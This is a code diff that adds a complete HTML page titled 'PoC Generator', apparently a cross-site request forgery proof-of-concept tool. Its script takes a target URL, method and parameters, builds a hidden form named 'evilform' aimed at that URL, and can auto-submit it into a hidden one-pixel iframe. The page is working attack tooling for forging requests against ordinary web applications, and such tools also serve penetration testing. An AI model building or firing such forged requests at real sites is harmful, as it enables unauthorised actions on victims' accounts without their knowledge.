@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+
+<html >
+	<head>
+		<meta charset="utf-8">
+		<title>PoC Generator</title>
+	</head>
+	<body>
+		<script>
+			function URLencode(str){
+				if(typeof str !== 'string') return str;
+				return encodeURIComponent(str.replace(/\r?\n/g,"\r\n"));
+			}
+function PercentEncodeWithoutPercent(str){
+	if(typeof str !== 'string') return str;
+	var dummypercent="gjahedfjgurihwfr3u31894ur93";
+	return URLencode(str.replace(/%/g,dummypercent)).replace(/gjahedfjgurihwfr3u31894ur93/g,'%');
+}
+function URLdecode(str){
+	if(typeof str !== 'string') return str;
+	return decodeURIComponent(str.replace(/\+/g,'%20'));
+}
+
+function escapeHTML(string) {
+	if(typeof string !== 'string') return string;
+	return string.replace(/[&'`"<>]/g, function(match) {
+		return {
+			'&': '&amp;',
+			"'": '&#x27;',
+			'`': '&#x60;',
+			'"': '&quot;',
+			'<': '&lt;',
+			'>': '&gt;',
+		}[match]
+	});
+}
+
+function errorMsg(msg){
+	if(typeof str === 'string') return msg;
+	document.getElementById("errormsg").innerText=msg;
+}
+function PostMessage(isSubmit){
+	var form=document.forms.messageForm;
+	var ez=document.getElementById("evilzone");
+	var ezhtml="";
+	var ezhtmlshadow="";
+	var url=form.url.value;
+	if(url == ""){
+		errorMsg("URL is empty!");
+		return;
+	}
+	var method=form.method.value;
+	if(method == ""){
+		errorMsg("method is empty!");
+		return;
+	}
+	var params=form.params.value;
+	if(params == ""){
+		errorMsg("params is empty!");
+		return;
+	}
+	// params=PercentEncodeWithoutPercent(params);
+	var param=params.split("&");
+	ezhtml+='<form target="dummyfrm" name="evilform" action="' + url + '" method="' + method + '">\n';
+	ezhtmlshadow+='<form target="dummyfrm" name="evilform" action="' + url + '" method="' + method + '">\n';
+	for(var i in param){
+		var t=param[i].split("=");
+		ezhtml+='<input type="hidden" name="'+URLdecode(t[0])+'" value="'+escapeHTML(URLdecode(t[1]))+'" />\n';
+		ezhtmlshadow+='<input type="hidden" name="'+escapeHTML(escapeHTML(URLdecode(t[0])))+'" value="'+escapeHTML(escapeHTML(URLdecode(t[1])))+'" />\n';
+	}
+	ezhtml+='</form>\n';
+	ezhtmlshadow+='</form>\n';
+	ezhtml+='<iframe src="x" width="1" height="1" name="dummyfrm" style="visibility:hidden"></iframe>';
+	ezhtmlshadow+='<iframe src="x" width="1" height="1" name="dummyfrm" style="visibility:hidden"></iframe>';
+	ez.innerHTML=ezhtml;
+
+	document.getElementById("nowhtml").innerText=ezhtml;
+	errorMsg(""); // clear erro message
+	if(isSubmit){
+		document.getElementById("stat").innerHTML+="<p>Request sent.</p><p>"+url+"</p><p>"+params+"</p><hr />";
+		var submit = HTMLFormElement.prototype["submit"].bind(document.evilform);
+		submit();
+	}
+}
+
+		</script>
+		<h1>PoCGenerator v1.0</h1>
+
+		<div>
+			URLencode:<textarea id="uea" name="urlencodearea" rows="1" cols="60"></textarea>
+			<button name="encodeIT" onclick="document.getElementById('uea').value=URLencode(document.getElementById('uea').value);return false;" >URLencode</button>
+		</div>
+		<hr>
+
+
+		<span id="errormsg"></span>
+
+		<form action="" name="messageForm">
+			URL:<input type="text" name="url" size="100" /> <br />
+			method:<input type="text" name="method" size="8" value="POST" /></br />
+			params:<br />
+			<textarea name="params" rows="6" cols="60" ></textarea><br />
+			<button name="postmessage" onclick="PostMessage(true);return false;" >create and submit</button>
+			<button name="postmessage" onclick="PostMessage(false);return false;" >create only</button>
+		</form>
+		<div id="evilzone"></div>
+		<hr />
+		<div id="nowhtml"></div>
+		<hr />
+		<p id="stat"></p>
+	</body>
+</html>
